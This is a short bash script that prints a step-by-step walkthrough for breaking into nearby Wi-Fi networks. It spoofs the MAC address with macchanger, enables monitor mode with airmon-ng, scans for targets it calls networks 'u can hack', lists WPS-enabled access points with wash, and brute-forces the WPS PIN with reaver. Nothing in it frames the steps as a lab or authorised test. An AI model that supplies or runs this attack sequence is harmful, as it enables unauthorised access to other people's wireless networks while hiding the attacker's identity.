#!/bin/bash
echo set ur wlan0 really down by:
echo '	ifconfig wlan0 down'
read
# ifconfig wlan0 down

echo 'change the mac which is assigned to wlan0'
echo '	u will see the current mac and the fakedMac'
echo '	macchanger -m 00:11:22:33:44:55 wlan0'
read
# macchanger -m 00:11:22:33:44:55

echo 'put ur wlan0 to up'
echo '	ifconfig wlan0 up'
read
# ifconfig wlan0 up

echo 'put ur wlan0 that it can do an injection'
echo 'it will create another interface mon0 which will do the injection'
echo 'so, from now, use mon0 which can do the injection'
echo '	airmon-ng start wlan0'
read
# airmon-ng start wlan0

echo 'check all wifi which u can hack'
echo 'u will get bssid00 channel00'
echo '	airodump-ng mon0'
read
# airodump-ng mon0

echo '	wash -i wlan0 -c channel00 -C -s'
read

echo 'reaver -i wlan0 -b bssid00 --fail-wait=360'œ
